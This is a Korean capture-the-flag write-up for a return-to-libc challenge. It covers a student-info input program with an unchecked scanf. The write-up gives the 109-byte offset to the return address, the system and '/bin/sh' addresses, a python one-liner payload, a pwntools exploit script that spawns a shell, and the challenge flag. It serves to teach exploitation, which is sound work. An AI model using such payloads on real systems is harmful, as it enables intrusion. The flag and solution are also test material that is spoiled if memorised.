#  문제이름

### 과제물02



## 문제

오늘 양교수님이  2주차 과제물을 내주셨다.

과제는 구조체를 이용하여 이름 학번 주소 사이트를 입력 받고 출력하는 프로그램을 만들어 오라는 과제를 내주셨다.
이정도면 될려나?

**이 문제는 (RTL)Return-to-libc기법이 필요한 문제입니다.**



## 문제 취지

rtl 기법을 연습할 수 있는 문제입니다.

기본적인 system("/bin/sh") 을 사용해야 하며

두가지 모두 문제안에 포함되어 있어 rtl기법만 알면 쉽게 풀 수 있는문제입니다.

## 풀이 방법



![K-20191011-702275](https://user-images.githubusercontent.com/37978105/66646135-4333e200-ec60-11e9-8969-74d1c0d5c325.png)

sample이 출력이 된후 입력을 하나 하나 받는다 참고로 샘플의 블로그가 어느정도 힌트를 준다.



![K-20191011-702945](https://user-images.githubusercontent.com/37978105/66646201-79716180-ec60-11e9-94ee-bceb99e8e3b3.png)

입력후 출력까지 된 화면이며 Yes나 yes를 입력하면 다시 입력하고 출력이 된후 다시 입력할지 물어본다.





문제의 취약점은 다시 입력하시겠습니까? (Yes of yes) 이후 입력하는부분이  취약하다

저 부분은 입력제한을 해두지 않아 RET을 건들 수 있다.



그렇다면 먼저 RET까지 거리를 계산해야하므로

![K-20191011-680422](https://user-images.githubusercontent.com/37978105/66643424-a1a99200-ec59-11e9-83a7-a05dca2fdefb.png)

gdb로  disas input_data 를 한 화면인대 +338 strcmp 이전에 있는 +316 scnaf가 bof가 일어난다는 것을 알 수 있으며

> 0x0804941e <+305>:	lea eax,ebp-0x69
>
> 0x08049421 <+308>:	push eax

부분이  입력받는 buf의 주소인것을 알 수 있으며 0x69 = 105 + 4(sfp) = 109 가 RET까지 거리 인것을 알아낼 수 있다.



그리고 rtl에 필요한 system주소와 /bin/sh은  다음과 같이 구할 수 있다.

![K-20191011-672220](https://user-images.githubusercontent.com/37978105/66643980-d79b4600-ec5a-11e9-9830-de9757353b62.png)



익스 코드는 다음과 같이 짤 수 있다.

> python -c 'print "A"+" "+"1"+" "+"1"+" "+"A"+" "+"A"+" "+"A"*109+"\x60\x90\x04\x08"+"AAAA"+"\x34\xc0\x04\x08"';cat) | ./rtl

혹은 pwntools를 이용하면 다음과 같다.

```
from pwn import *
context.log_level = 'debug'
p=process("./rtl")

sys = 0x8049060
sh = 0x804c030

py = 'A'*109
py += p32(sys)
py += 'a'*4
py += p32(sh)

p.sendlineafter('>','a')
p.sendlineafter('>','1')
p.sendlineafter('>','1')
p.sendlineafter('>','a')
p.sendlineafter('>','a')
p.recvuntil("(Yes or yes)")

p.sendline(py)

p.interactive()
```



다음과 같이 쉘을 얻어 flag를 출력할 수 있다.

![](https://user-images.githubusercontent.com/37978105/66646576-7e82e080-ec61-11e9-9a3b-a62b27f1e9ff.png)



## Flag

scpCTF{H0w_AbOut_rT1_h3h3}



## 힌트

rtl기법을 잘 알고 계신가요?  

익스코드에 어려움을 겪고 계신다면 동방을 찾아와 주세요!!
